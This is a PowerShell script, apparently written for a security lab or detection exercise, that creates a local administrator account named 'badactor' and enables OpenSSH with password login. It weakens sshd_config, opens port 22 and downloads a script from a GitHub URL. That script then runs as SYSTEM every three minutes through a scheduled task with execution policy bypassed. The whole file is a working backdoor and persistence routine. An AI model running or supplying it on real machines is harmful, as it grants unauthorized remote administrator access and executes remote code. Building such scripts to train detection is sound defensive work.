param (
    [string]$username = "badactor",
    [string]$password,
    [string]$editScriptUrl = "https://raw.githubusercontent.com/lalith2306/SpektraTask/refs/heads/main/edit_sshd_config.ps1"
)

# Create a secure string for the password
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force

# Create the new user
New-LocalUser -Name $username -Password $securePassword -FullName "Bad Actor" -Description "User for SSH access"

# Add user to Administrators group (required for SSH access by default OpenSSH configuration)
Add-LocalGroupMember -Group "Administrators" -Member $username

# Install OpenSSH Server
$osVersion = (Get-CimInstance -ClassName Win32_OperatingSystem).Version
if ($osVersion -ge "10.0.17763") {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
} else {
    $openSshUrl = "https://github.com/PowerShell/Win32-OpenSSH/releases/download/v8.1.0.0p1-Beta/OpenSSH-Win64.zip"
    $zipPath = "$env:TEMP\OpenSSH-Win64.zip"
    $installPath = "C:\Program Files\OpenSSH"
    Invoke-WebRequest -Uri $openSshUrl -OutFile $zipPath
    Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
    & "$installPath\OpenSSH-Win64\install-sshd.ps1"
}

# Start and configure SSH service
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# Ensure firewall rule for SSH (port 22)
New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22

# Configure SSH to allow password authentication
$sshdConfigPath = "C:\ProgramData\ssh\sshd_config"
$sshdConfig = Get-Content -Path $sshdConfigPath
$sshdConfig = $sshdConfig -replace "#PasswordAuthentication yes", "PasswordAuthentication yes"
$sshdConfig = $sshdConfig -replace "Match Group administrators", "#Match Group administrators"
$sshdConfig = $sshdConfig -replace "AuthorizedKeysFile .ssh/authorized_keys", "#AuthorizedKeysFile .ssh/authorized_keys"
Set-Content -Path $sshdConfigPath -Value $sshdConfig

# Set up auditing for sshd_config
$acl = Get-Acl -Path $sshdConfigPath
$auditRule = New-Object System.Security.AccessControl.FileSystemAuditRule(
    "Everyone",
    "Write",
    "Success"
)
$acl.AddAuditRule($auditRule)
Set-Acl -Path $sshdConfigPath -AclObject $acl

# Add "# edited by badactor" to the top of sshd_config
$newContent = "# edited by badactor`n" + (Get-Content -Path $sshdConfigPath -Raw)
Set-Content -Path $sshdConfigPath -Value $newContent

# Restart SSH service to apply changes
Restart-Service sshd

# Download the recurring edit script
$editScriptPath = "C:\ProgramData\edit_sshd_config.ps1"
Invoke-WebRequest -Uri $editScriptUrl -OutFile $editScriptPath

# Create a scheduled task to run the edit script every 3 minutes
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $editScriptPath -sshdConfigPath $sshdConfigPath"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 3) -RepetitionDuration ([TimeSpan]::MaxValue)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -TaskName "EditSshdConfig" -Action $action -Trigger $trigger -Principal $principal -Description "Edits sshd_config every 3 minutes to trigger audit logs" -Force
